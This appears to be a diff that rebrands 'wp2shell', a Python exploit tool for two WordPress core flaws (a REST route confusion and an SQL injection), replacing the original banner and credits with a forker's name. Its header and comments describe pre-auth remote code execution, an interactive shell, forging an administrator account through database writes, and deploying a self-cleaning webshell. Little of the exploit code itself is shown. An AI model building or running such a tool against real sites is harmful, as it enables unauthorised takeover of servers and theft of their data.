@@ -3,6 +3,11 @@
 # core wp2shell advisory (CVE-2026-63030 REST batch route confusion /
 # CVE-2026-60137 author__not_in SQLi).
 #
+# Author  : bahartanir (katherinepierce)
+# Fork of : ZephrFish/wp2shell-scanner
+# Research: Route confusion + SQLi by Adam Kues (Assetnote);
+#           oEmbed->changeset RCE chain by Mustafa Can İPEKÇİ (nukedx)
+#
 # Modes (select exactly one with a flag; target is positional):
 #   --scan   <hosts...> [-f hosts.txt] [-j] [-t N]  non-destructive exposure check
 #   --check  <url>                                   confirm blind SQLi (harmless)
@@ -12,7 +17,6 @@
 #   --rce    <url> --cmd id                          credential-less pre-auth RCE
 #   --rce    <url> -i                                credential-less RCE, interactive shell
 #   --root-prereq <url> --password <cracked>         benign LPE prereq check
-#
 #
 # Python standard library only.
 import argparse
@@ -43,17 +47,18 @@ DEFAULT_DELAY = 0.15
 DEFAULT_TIMEOUT = 15
 
 BANNER = r"""
-  _____          _         ____
- |__  /___ _ __ | |__  _ _/ ___|  ___  ___
-   / // _ \ '_ \| '_ \| '__\___ \ / _ \/ __|
-  / /|  __/ |_) | | | | |   ___) |  __/ (__
- /____\___| .__/|_| |_|_|  |____/ \___|\___|
-          |_|       wp2shell  -  ZephrSec
+ _  __     _   _               _            ____  _
+| |/ /__ _| |_| |__   ___ _ __(_)_ __   ___|  _ \(_) ___ _ __ ___ ___
+| ' // _` | __| '_ \ / _ \ '__| | '_ \ / _ \ |_) | |/ _ \ '__/ __/ _ \
+| . \ (_| | |_| | | |  __/ |  | | | | |  __/  __/| |  __/ | | (_|  __/
+|_|\_\__,_|\__|_| |_|\___|_|  |_|_| |_|\___|_|   |_|\___|_|  \___\___|
+
+        wp2shell  |  CVE-2026-63030 / CVE-2026-60137  |  @bahartanir
 """
 
 
 def _banner():
-    """Print the ZephrSec banner (stderr, so --scan -j stdout stays clean JSON)."""
+    """Print banner to stderr so --scan -j stdout stays clean JSON."""
     sys.stderr.write(BANNER + "\n")
 
 
@@ -376,7 +381,7 @@ def _run_plugin_commands(args, commands, interactive=False):
             return r.read().decode("utf-8", "replace")
 
     # authenticate with the recovered/cracked admin password
-    print("[+] ZephrSec PoC")
+    print("[+] bahartanir / katherinepierce - wp2shell PoC")
     print("[*] logging in as %s ..." % args.user)
     get("/wp-login.php")  # sets wordpress_test_cookie
     post("/wp-login.php", {
@@ -604,8 +609,8 @@ def cmd_root_prereq(args):
 # rce — credential-less pre-auth RCE (no cracked password needed)
 # Turns the read-only SQLi into DB writes to forge an administrator, then
 # deploys a self-cleaning webshell. See deploy() for the step-by-step chain.
-# Route confusion + SQLi: Adam Kues (Assetnote); stock-default RCE chain
-# (oEmbed -> changeset -> re-entry): Mustafa Can İPEKÇİ (nukedx).
+# Research credit: Route confusion + SQLi by Adam Kues (Assetnote);
+# oEmbed->changeset->re-entry RCE chain by Mustafa Can İPEKÇİ (nukedx).
 # ==========================================================================
 class PreAuthRCE:
     UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
